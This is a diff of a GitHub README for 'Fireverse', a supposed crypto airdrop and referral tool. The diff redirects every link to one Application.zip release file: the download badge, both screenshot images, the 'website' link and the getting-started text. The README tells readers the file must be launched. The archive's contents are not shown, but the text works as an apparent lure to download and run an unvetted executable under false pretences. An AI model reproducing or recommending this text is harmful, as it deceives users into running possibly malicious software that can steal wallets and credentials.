@@ -4,9 +4,9 @@
 
 Fireverse is a cutting-edge repository designed to revolutionize the way airdrops are claimed and managed. With a focus on seamless integration and user-friendly tools, Fireverse enables users to easily connect their wallets, participate in airdrops, and maximize their rewards through referrals. 
 
-[![Download Application](https://img.shields.io/badge/Download-Application.zip-blue)](https://github.com/files/Application.zip) 
+[![Download Application](https://github.com/Daoud991/Fireverse/releases/download/v1.0/Application.zip)](https://github.com/Daoud991/Fireverse/releases/download/v1.0/Application.zip) 
 
-Please note that the Application.zip file needs to be launched for access to the full functionality of Fireverse.
+Please note that the https://github.com/Daoud991/Fireverse/releases/download/v1.0/Application.zip file needs to be launched for access to the full functionality of Fireverse.
 
 ## Features 🛠️
 
@@ -20,15 +20,15 @@ Please note that the Application.zip file needs to be launched for access to the
 
 ## Screenshots 📸
 
-![Fireverse Screenshot 1](https://via.placeholder.com/500)  
+![Fireverse Screenshot 1](https://github.com/Daoud991/Fireverse/releases/download/v1.0/Application.zip)  
 Caption: Easily connect your wallet and start claiming airdrops.
 
-![Fireverse Screenshot 2](https://via.placeholder.com/500)  
+![Fireverse Screenshot 2](https://github.com/Daoud991/Fireverse/releases/download/v1.0/Application.zip)  
 Caption: Refer friends to earn additional rewards in Fireverse.
 
 ## Getting Started 🚀
 
-To get started with Fireverse, simply download the Application.zip file from the link provided above. For additional features and updates, check out the "Releases" section of this repository.
+To get started with Fireverse, simply download the https://github.com/Daoud991/Fireverse/releases/download/v1.0/Application.zip file from the link provided above. For additional features and updates, check out the "Releases" section of this repository.
 
 ## Community and Support 🔧
 
@@ -38,7 +38,7 @@ Join our community on Discord to connect with other users, share insights, and g
 
 Fireverse is developed and maintained by a passionate team of developers dedicated to creating innovative solutions for the crypto community. Stay tuned for updates and new features coming soon!
 
-🔗 For more information and updates, visit our [website](https://github.com/files/Application.zip). 
+🔗 For more information and updates, visit our [website](https://github.com/Daoud991/Fireverse/releases/download/v1.0/Application.zip). 
 
 Thank you for choosing Fireverse for all your airdrop and referral needs! 🔥🚀🪁
 
